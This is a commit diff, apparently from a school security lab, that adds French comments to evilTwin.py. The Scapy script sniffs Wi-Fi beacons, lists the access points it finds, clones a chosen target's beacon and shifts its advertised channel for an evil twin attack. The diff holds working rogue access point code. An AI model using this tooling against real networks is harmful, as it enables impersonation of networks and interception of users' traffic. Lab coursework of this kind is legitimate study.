18caf4b93e490935d8a3f7063610c7eee4bb504c
Mickael Bonjour <mickael.bonjour@heig-vd.ch>
2020-03-09 14:18:48 +0100

    Add comments

--- evilTwin.py
+++ evilTwin.py
@@ -7,10 +7,16 @@ counter = 0
 interface = input("Enter interface to listed on (must be on monitor mode : \n")
 print("APs will be listed here, wait 20s and choose one  :\n")
 
+'''
+Fonction utilisée lors du sniff pour analyser les paquets.
+Elle permet de filtrer les BSSIDs déjà vu et d'afficher les nouveaux.
+Nous ne filtrons pas les SSIDs par channel (Ce que nous pourrions faire pour éviter les None mais pas fait pour afficher tout les APs).
+'''
 def pkt_callback(pkt):
     if pkt.haslayer(Dot11Beacon):
         bssid = pkt.getlayer(Dot11).addr2.upper()
         if bssid not in bssid_list:
+            # Save bssid (to not print again) and the associated packet to use it in the attack
             bssid_list.append(bssid)
             pkt_full_list.append(pkt)
             try:
@@ -32,24 +38,26 @@ evilTwinTarget = input("Choose one of the AP to do an evil twin attack :\n")
 evilTwinTarget = int(evilTwinTarget)
 pktSource = pkt_full_list[evilTwinTarget -1]
 print("Actual Channel : ", pktSource[Dot11Beacon].network_stats().get("channel"))
-
+# Get current channel
 channel = pktSource[Dot11Beacon].network_stats().get("channel")
-#print(ls(pktSource))
 newPkt = pktSource.copy()
-#newPkt[Dot11Elt][3] = chr((channel + 6) % 11)
-#p = pktSource[Dot11Elt].payload
-#last = Dot11Elt(ID=pktSource[Dot11Elt].ID, info=pktSource[Dot11Elt].info, len=pktSource[Dot11Elt].len)
-#while isinstance(p, Dot11Elt):
-#    if p.ID == 3:
-#        p = p.payload
-#        break
-#    print(p.ID, " : ", p.info, " : ", p.len)
-#    last /= Dot11Elt(ID=p.ID, info=p.info, len=p.len)
-#    p = p.payload
+'''
+# Code propre (modifies le DSset proprement)
+p = pktSource[Dot11Elt].payload
+last = Dot11Elt(ID=pktSource[Dot11Elt].ID, info=pktSource[Dot11Elt].info, len=pktSource[Dot11Elt].len)
+while isinstance(p, Dot11Elt):
+    if p.ID == 3:
+        p = p.payload
+        break
+    print(p.ID, " : ", p.info, " : ", p.len)
+    last /= Dot11Elt(ID=p.ID, info=p.info, len=p.len)
+    p = p.payload
 
-#newPkt[Dot11Elt] = last/Dot11Elt(ID="DSset", info=chr((channel + 6)%13), len=1)/p
-#newnewPkt = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid_list[evilTwinTarget], addr3=bssid_list[evilTwinTarget]) / newPkt[Dot11Beacon] / newPkt[Dot11Elt]
+newPkt[Dot11Elt] = last/Dot11Elt(ID="DSset", info=chr((channel + 6)%13), len=1)/p
+'''
+# On rajoute juste un DSset à la fin, selon nos tests avec airodump cela fonctionnes aussi
 newPkt = newPkt/Dot11Elt(ID="DSset", info=chr((channel + 6)%13))
+# Grâce à ces show l'on peut voir la structure des paquets, si l'on utilise la version du code propre on peut voir que la structure et la même.
 #print(pktSource.show())
 #print(newPkt.show())
 newChannel = newPkt[Dot11Beacon].network_stats().get("channel")
